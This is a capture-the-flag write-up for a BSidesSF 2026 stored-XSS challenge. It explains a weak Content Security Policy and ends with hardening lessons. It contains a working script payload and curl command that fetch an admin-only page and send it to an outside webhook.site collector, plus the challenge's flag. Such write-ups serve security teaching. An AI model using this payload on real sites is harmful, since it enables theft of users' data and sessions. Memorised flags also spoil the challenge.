# XSS One — BSidesSF CTF 2026 | Web

**Category:** Web
**Author:** itsc0rg1
**Flag:** `CTF{X55-tut0r1al-1s-back}`

---

## TL;DR

Stored XSS tutorial. CSP allows `unsafe-inline` and `connect-src *`. Submit an inline `<script>` that fetches the admin-only `/xss-one-flag` endpoint and exfiltrates the response to an external webhook.

---

## Description

The challenge presents a simple XSS lab:

- `POST /xss-one-result` — stores a payload and renders it for the admin bot
- `GET /xss-one-flag` — returns the flag, but only for admin sessions ("Sorry, admins only!" for non-admin)

The goal is to inject JavaScript that executes in the admin's browser context.

---

## Analysis

### CSP Header

```
default-src 'self' 'unsafe-inline';
script-src  'self' 'unsafe-inline';
connect-src *;
style-src-elem 'self' fonts.googleapis.com fonts.gstatic.com;
font-src 'self' fonts.gstatic.com fonts.googleapis.com
```

**Weaknesses:**
- `script-src 'unsafe-inline'` — any inline `<script>` block executes freely
- `connect-src *` — `fetch()` / `XMLHttpRequest` to any external host is allowed

### Vulnerability

**CWE-79: Stored Cross-Site Scripting (XSS)**

User-supplied payload rendered unsanitized in the page served to the admin bot. With `unsafe-inline`, any injected `<script>` tag executes with the admin's session.

---

## Exploit

### Payload

```html
<script>
fetch("/xss-one-flag")
  .then(r => r.text())
  .then(flag => fetch("https://webhook.site/YOUR-UUID?f=" + encodeURIComponent(flag)));
</script>
```

**Flow:**
1. Admin bot renders the page containing the payload
2. Inline JS executes (allowed by `unsafe-inline`)
3. `fetch("/xss-one-flag")` runs with admin session cookies → returns the flag
4. `fetch("https://webhook.site/...")` exfiltrates the flag (allowed by `connect-src *`)

### Steps

```bash
# 1. Get a webhook.site UUID for exfiltration
UUID="your-webhook-uuid"

# 2. Submit the XSS payload
curl -X POST https://web-tutorial-1-0c19a827.challenges.bsidessf.net/xss-one-result \
  --data-urlencode "payload=<script>fetch('/xss-one-flag').then(r=>r.text()).then(f=>fetch('https://webhook.site/$UUID?f='+encodeURIComponent(f)));</script>"

# 3. Wait ~10s for admin bot to visit, then check webhook
curl -s "https://webhook.site/token/$UUID/requests" | python3 -c "
import sys, json
for r in json.load(sys.stdin)['data']:
    print(r['url'])
"
# → https://webhook.site/UUID?f=CTF{X55-tut0r1al-1s-back}
```

---

## Key Lessons

- `unsafe-inline` in `script-src` completely undermines XSS protection
- `connect-src *` makes exfiltration trivial
- Always use nonce-based or hash-based CSP; never `unsafe-inline` in production

---

## Flag

```
CTF{X55-tut0r1al-1s-back}
```
